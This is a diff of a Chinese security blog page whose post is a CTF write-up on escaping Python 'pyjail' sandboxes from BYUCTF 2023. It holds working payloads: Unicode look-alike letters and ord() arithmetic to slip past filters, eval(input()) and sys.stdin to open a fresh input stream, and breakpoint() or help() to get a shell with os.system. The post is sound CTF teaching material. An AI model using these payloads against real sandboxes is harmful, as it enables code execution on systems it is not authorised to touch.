@@ -1,11 +1,10 @@
 <!DOCTYPE html><html lang="en">
   <head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>Home - DumKiy's blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>pyjail bypass-05 绕过长度限制 - DumKiy's blog</title>
 
-<meta name="description" content="Watch And Learn
-">
-<link rel="canonical" href="http://localhost:4000/"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+<meta name="description" content="绕过长度限制BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制eval((__import__("re").sub(r'[a-z0-9]','',input("code &gt; ").lower()))[:130])题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取...">
+<link rel="canonical" href="http://localhost:4000/python/2023/05/30/pyjail-bypass-05-%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
 
 <meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
 
@@ -255,7 +254,7 @@
 </head>
   <body>
     <div class="root" data-is-touch="false">
-      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport cell cell--auto">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
 
       <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
       <div class="header__title">
@@ -289,75 +288,179 @@ l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
 </svg>
 <a title="Watch And Learn
 " href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
-        <ul><li class="navigation__item navigation__item--active"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
       </nav></div>
   </header>
 </div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
 
-              <div class="col-aside d-print-none js-col-aside"></div>
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
 
               <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
 
 <!-- end custom main top snippet -->
-<article itemscope itemtype="http://schema.org/WebPage"><header style="display:none;"><h1>Home</h1></header><meta itemprop="headline" content="Home"><meta itemprop="author" content="DumKiy"/><div class="js-article-content"><div class="layout--articles"><div class="article-list items"><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="GOAD,Active+Directory" data-categories="Pentest">
-        <div class="item__content"><span class="item__meta">Nov 28</span><a itemprop="headline" class="item__header" href="/pentest/2023/11/28/GOAD-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html">GOAD 靶场环境搭建</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="nodejs,vega" data-categories="CTF">
-        <div class="item__content"><span class="item__meta">Nov 27</span><a itemprop="headline" class="item__header" href="/ctf/2023/11/27/TPCTF2023-%E9%83%A8%E5%88%86-web-Writeup.html">TPCTF 2023 graphoid writeup</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="windows,LPE,Info+gathering" data-categories="Pentest">
-        <div class="item__content"><span class="item__meta">Nov 20</span><a itemprop="headline" class="item__header" href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9.html">Windows 提权知识点</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="windows,LPE,Info+gathering" data-categories="Pentest">
-        <div class="item__content"><span class="item__meta">Nov 20</span><a itemprop="headline" class="item__header" href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-3-%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83.html">Windows 提权（三）利用服务权限错误提权</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="windows,LPE,Info+gathering" data-categories="Pentest">
-        <div class="item__content"><span class="item__meta">Nov 20</span><a itemprop="headline" class="item__header" href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-2-%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F.html">Windows 提权（二）进程相关提权方式</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="windows,LPE,Info+gathering" data-categories="Pentest">
-        <div class="item__content"><span class="item__meta">Nov 20</span><a itemprop="headline" class="item__header" href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-1-%E5%88%A9%E7%94%A8%E5%AF%BC%E5%87%BA%E6%88%96%E6%9F%A5%E6%89%BE%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83.html">Windows 提权（一）利用导出或查找密码提权</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="CMS" data-categories="code+audit">
-        <div class="item__content"><span class="item__meta">Aug 09</span><a itemprop="headline" class="item__header" href="/code%20audit/2023/08/09/DirCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html">DirCMS 审计</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="pyjail" data-categories="Python">
-        <div class="item__content"><span class="item__meta">Aug 03</span><a itemprop="headline" class="item__header" href="/python/2023/08/03/pyjail-bypass-09-%E7%BB%95%E8%BF%87%E8%BE%93%E5%87%BA%E9%99%90%E5%88%B6.html">pyjail bypass-09 绕过输出限制</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Jekyll" data-categories="ENV">
-        <div class="item__content"><span class="item__meta">Jul 30</span><a itemprop="headline" class="item__header" href="/env/2023/07/30/jeklly-theme-chirpy-%E5%A2%9E%E5%8A%A0%E7%9B%AE%E5%BD%95%E6%98%BE%E7%A4%BA%E7%BA%A7%E5%88%AB.html">Jekyll-theme-chirpy 主题增加目录展示级别</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="xss" data-categories="Python">
-        <div class="item__content"><span class="item__meta">Jul 30</span><a itemprop="headline" class="item__header" href="/python/2023/07/30/python-Flask-%E4%B8%AD%E7%9A%84-XSS.html">Flask 中的 XSS</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="inf" data-categories="Python">
-        <div class="item__content"><span class="item__meta">Jul 27</span><a itemprop="headline" class="item__header" href="/python/2023/07/27/python-inf-tricks.html">Python inf 特性</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Deserialization" data-categories="Java">
-        <div class="item__content"><span class="item__meta">Jul 24</span><a itemprop="headline" class="item__header" href="/java/2023/07/24/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-resolveClass.html">Java 反序列化绕过 resolvClass</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Exchange" data-categories="Exchange">
-        <div class="item__content"><span class="item__meta">Jul 14</span><a itemprop="headline" class="item__header" href="/exchange/2023/07/14/Exchange-PowerShell-Remoting.html">Exchange PowerShell Remoting</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="NTLM" data-categories="Exchange">
-        <div class="item__content"><span class="item__meta">Jul 14</span><a itemprop="headline" class="item__header" href="/exchange/2023/07/14/BurpSuite-NTLM-%E6%8A%93%E5%8C%85%E9%97%AE%E9%A2%98.html">BurpSuite NTLM 抓包问题</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="%E5%B7%A5%E5%85%B7" data-categories="code+audit">
-        <div class="item__content"><span class="item__meta">Jul 11</span><a itemprop="headline" class="item__header" href="/code%20audit/2023/07/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7-Semgrep.html">代码审计工具 Semgrep</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="RMI" data-categories="Java">
-        <div class="item__content"><span class="item__meta">Jul 04</span><a itemprop="headline" class="item__header" href="/java/2023/07/04/Java-JNDI-%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.html">Java JNDI 安全笔记</a></div>
-      </li></div>
-</div><div class="layout--home"><div class="pagination"><p>80 post articles, 5 pages.</p>
-    <div class="pagination__menu">
-      <ul class="menu menu--nowrap"><li><div class="button button--secondary button--circle disabled">
-            <i class="fas fa-angle-left"></i>
-          </div></li><li>
-              <div class="button button--primary button--circle focus"><span>1</span></div>
-            </li><li>
-                <a class="button button--secondary button--circle" href="/page2"><span>2</span></a>
-              </li><li>
-                <a class="button button--secondary button--circle" href="/page3"><span>3</span></a>
-              </li><li>
-                <a class="button button--secondary button--circle" href="/page4"><span>4</span></a>
-              </li><li>
-                <a class="button button--secondary button--circle" href="/page5"><span>5</span></a>
-              </li><li><a class="button button--secondary button--circle" href="/page2">
-            <i class="fas fa-angle-right"></i>
-          </a></li></ul>
-    </div>
-  </div></div>
-<script>/*(function () {
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>pyjail bypass-05 绕过长度限制</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2023-07-01-pyjail-bypass-05-绕过长度限制.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="pyjail bypass-05 绕过长度限制"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=pyjail">pyjail</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>May 30, 2023</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2023-05-30T18:23:57+08:00">
+    <meta itemprop="keywords" content="pyjail"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
 
-})();*/
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><h2 id="绕过长度限制">绕过长度限制</h2>
+<p>BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">eval</span><span class="p">((</span><span class="nf">__import__</span><span class="p">(</span><span class="sh">"</span><span class="s">re</span><span class="sh">"</span><span class="p">).</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">[a-z0-9]</span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">,</span><span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">code &gt; </span><span class="sh">"</span><span class="p">).</span><span class="nf">lower</span><span class="p">()))[:</span><span class="mi">130</span><span class="p">])</span>
+</code></pre></div></div>
+
+<p>题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">print</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="nf">bytes</span><span class="p">([</span><span class="mi">102</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">120</span><span class="p">,</span><span class="mi">116</span><span class="p">])).</span><span class="nf">read</span><span class="p">())</span>
+</code></pre></div></div>
+<p>函数名比较好绕过，直接使用 unicode。数字也可以使用 ord 来获取然后进行相减。我这里选择的是 chr(333).</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># f = 102 = 333-231 = ord('ō')-ord('ç')
+# a = 108 = 333-225 = ord('ō')-ord('á')
+# l = 97 = 333-236 = ord('ō')-ord('ì')
+# g = 103 = 333-230 = ord('ō')-ord('æ')
+# . = 46 = 333-287 = ord('ō')-ord('ğ')
+# t = 116 = 333-217 = ord('ō')-ord('Ù')
+# x = 120 = = 333-213 = ord('ō')-ord('Õ')
+</span>
+<span class="nf">print</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="nf">bytes</span><span class="p">([</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">ō</span><span class="sh">'</span><span class="p">)</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">ç</span><span class="sh">'</span><span class="p">),</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">ō</span><span class="sh">'</span><span class="p">)</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">á</span><span class="sh">'</span><span class="p">),</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">ō</span><span class="sh">'</span><span class="p">)</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">ì</span><span class="sh">'</span><span class="p">),</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">ō</span><span class="sh">'</span><span class="p">)</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">æ</span><span class="sh">'</span><span class="p">),</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">ō</span><span class="sh">'</span><span class="p">)</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">ğ</span><span class="sh">'</span><span class="p">),</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">ō</span><span class="sh">'</span><span class="p">)</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">Ù</span><span class="sh">'</span><span class="p">),</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">ō</span><span class="sh">'</span><span class="p">)</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">Õ</span><span class="sh">'</span><span class="p">),</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">ō</span><span class="sh">'</span><span class="p">)</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">Ù</span><span class="sh">'</span><span class="p">)])).</span><span class="nf">read</span><span class="p">())</span>
+</code></pre></div></div>
+<p>但这样的话其实长度超出了限制。而题目的 eval 表示不支持分号 ;，这种情况下，我们可以添加一个 exec。然后将 ord 以及不变的 <code class="language-plaintext highlighter-rouge">a('ō')</code> 进行替换。这样就可以构造一个满足条件的 payload</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">exec</span><span class="p">(</span><span class="sh">"</span><span class="s">a=ord;b=a(</span><span class="sh">'</span><span class="s">ō</span><span class="sh">'</span><span class="s">);print(open(bytes([b-a(</span><span class="sh">'</span><span class="s">ç</span><span class="sh">'</span><span class="s">),b-a(</span><span class="sh">'</span><span class="s">á</span><span class="sh">'</span><span class="s">),b-a(</span><span class="sh">'</span><span class="s">ì</span><span class="sh">'</span><span class="s">),b-a(</span><span class="sh">'</span><span class="s">æ</span><span class="sh">'</span><span class="s">),b-a(</span><span class="sh">'</span><span class="s">ğ</span><span class="sh">'</span><span class="s">),b-a(</span><span class="sh">'</span><span class="s">Ù</span><span class="sh">'</span><span class="s">),b-a(</span><span class="sh">'</span><span class="s">Õ</span><span class="sh">'</span><span class="s">),b-a(</span><span class="sh">'</span><span class="s">Ù</span><span class="sh">'</span><span class="s">)])).read())</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>但其实尝试之后发现这个 payload 会报错，原因在于其中的某些 unicode 字符遇到 lower() 时会发生变化，避免 lower 产生干扰，可以在选取 unicode 时选择 ord 值更大的字符。例如 chr(4434)</p>
+
+<p>当然，可以直接使用 input 函数来绕过长度限制。</p>
+
+<h3 id="打开-input-输入">打开 input 输入</h3>
+<p>如果沙箱内执行的内容是通过 input 进行传入的话（不是 web 传参），我们其实可以传入一个 input 打开一个新的输入流，然后再输入最终的 payload，这样就可以绕过所有的防护。</p>
+
+<p>以 BYUCTF2023 jail a-z0-9 为例：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">eval</span><span class="p">((</span><span class="nf">__import__</span><span class="p">(</span><span class="sh">"</span><span class="s">re</span><span class="sh">"</span><span class="p">).</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">[a-z0-9]</span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">,</span><span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">code &gt; </span><span class="sh">"</span><span class="p">).</span><span class="nf">lower</span><span class="p">()))[:</span><span class="mi">130</span><span class="p">])</span>
+</code></pre></div></div>
+<p>即使限制了字母数字以及长度，我们可以直接传入下面的 payload（注意是 unicode）</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">𝘦𝘷𝘢𝘭</span><span class="p">(</span><span class="n">𝘪𝘯𝘱𝘶𝘵</span><span class="p">())</span>
+</code></pre></div></div>
+<p>这段 payload 打开 input 输入后，我们再输入最终的 payload 就可以正常执行。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">whoami</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>打开输入流需要依赖 input 函数，no builtins 的环境中或者题目需要以 http 请求的方式进行输入时，这种方法就无法使用了。</p>
+
+<p>下面是一些打开输入流的方式:</p>
+<h4 id="sysstdinread">sys.stdin.read()</h4>
+<p>注意输入完毕之后按 ctrl+d 结束输入</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">eval</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
+<span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">whoami</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">kali</span>
+<span class="mi">0</span>
+<span class="o">&gt;&gt;&gt;</span>
+</code></pre></div></div>
+<h4 id="sysstdinreadline">sys.stdin.readline()</h4>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">eval</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">readline</span><span class="p">())</span>
+<span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">whoami</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="sysstdinreadlines">sys.stdin.readlines()</h4>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">eval</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">])</span>
+<span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">whoami</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>在 python2 中，在python 2中，input 函数从标准输入接收输入之后会自动 eval 求值。因此无需在前面加上 eval。但 raw_input 不会自动 eval。</p>
+
+<h3 id="breakpoint-函数">breakpoint 函数</h3>
+<p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p>
+
+<p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵</span><span class="p">()</span>
+<span class="o">--</span><span class="n">Return</span><span class="o">--</span>
+<span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">stdin</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span><span class="p">()</span><span class="o">-&gt;</span><span class="bp">None</span>
+<span class="p">(</span><span class="n">Pdb</span><span class="p">)</span> <span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">ls</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">a</span><span class="o">-</span><span class="n">z0</span><span class="o">-</span><span class="mf">9.</span><span class="n">py</span>  <span class="n">exp2</span><span class="p">.</span><span class="n">py</span>  <span class="n">exp</span><span class="p">.</span><span class="n">py</span>  <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+<span class="mi">0</span>
+<span class="p">(</span><span class="n">Pdb</span><span class="p">)</span> <span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">sh</span><span class="sh">'</span><span class="p">)</span>
+<span class="err">$</span> <span class="n">ls</span>
+<span class="n">a</span><span class="o">-</span><span class="n">z0</span><span class="o">-</span><span class="mf">9.</span><span class="n">py</span>  <span class="n">exp2</span><span class="p">.</span><span class="n">py</span>  <span class="n">exp</span><span class="p">.</span><span class="n">py</span>  <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div></div>
+
+<h3 id="help-函数">help 函数</h3>
+<p>help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh</p>
+
+<p>当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">𝘩𝘦𝘭𝘱</span><span class="p">()</span>
+</code></pre></div></div>
+<p>然后输入 os,此时会进入 os 的帮助文档。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">help</span><span class="o">&gt;</span> <span class="n">os</span>
+</code></pre></div></div>
+<p>然后在输入 <code class="language-plaintext highlighter-rouge">!sh</code> 就可以拿到 /bin/sh, 输入 <code class="language-plaintext highlighter-rouge">!bash</code> 则可以拿到 /bin/bash</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">help</span><span class="o">&gt;</span> <span class="n">os</span>
+<span class="err">$</span> <span class="n">ls</span>
+<span class="n">a</span><span class="o">-</span><span class="n">z0</span><span class="o">-</span><span class="mf">9.</span><span class="n">py</span>  <span class="n">exp2</span><span class="p">.</span><span class="n">py</span>  <span class="n">exp</span><span class="p">.</span><span class="n">py</span>  <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+<span class="err">$</span> 
+</code></pre></div></div>
+
+<h2 id="参考资料">参考资料</h2>
+<ul>
+  <li><a href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals">Python沙箱逃逸小结</a></li>
+  <li><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80">Python 沙箱逃逸的经验总结</a></li>
+  <li><a href="https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/">Python 沙箱逃逸的通解探索之路</a></li>
+  <li><a href="https://xz.aliyun.com/t/12303#toc-11">python沙箱逃逸学习记录</a></li>
+  <li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">Bypass Python sandboxes</a></li>
+  <li><a href="https://zhuanlan.zhihu.com/p/578986988">[PyJail] python沙箱逃逸探究·上（HNCTF题解 - WEEK1）</a></li>
+  <li><a href="https://zhuanlan.zhihu.com/p/579057932">[PyJail] python沙箱逃逸探究·中（HNCTF题解 - WEEK2）</a></li>
+  <li><a href="https://zhuanlan.zhihu.com/p/579183067">[PyJail] python沙箱逃逸探究·下（HNCTF题解 - WEEK3）</a></li>
+  <li><a href="https://ctftime.org/writeup/31883">audited2</a></li>
+  <li><a href="https://www.woodwhale.top/archives/hnctfj-ail-all-in-one">【ctf】HNCTF Jail All In One</a></li>
+  <li><a href="https://ctftime.org/writeup/28286">HAXLAB — Endgame Pwn</a></li>
+  <li><a href="https://ctftime.org/writeup/28286">Python沙箱逃逸的n种姿势</a></li>
+  <li><a href="https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html">hxp2020-audited</a></li>
+</ul>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2023-05-30T18:23:57+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/python/2023/05/30/pyjail-bypass-04-%E7%BB%95%E8%BF%87%E5%A4%9A%E8%A1%8C%E9%99%90%E5%88%B6.html">pyjail bypass-04 绕过多行限制</a></div><div class="next"><span>NEXT</span><a href="/python/2023/05/30/pyjail-bypass-06-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%B8%8E%E5%87%BD%E6%95%B0%E7%AF%A1%E6%94%B9.html">pyjail bypass-06 变量覆盖与函数篡改</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
 </script>
-
-
-
 </div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
 
 <!-- end custom main bottom snippet -->
@@ -902,6 +1005,68 @@ window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
 /*(function () {
 
 })();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
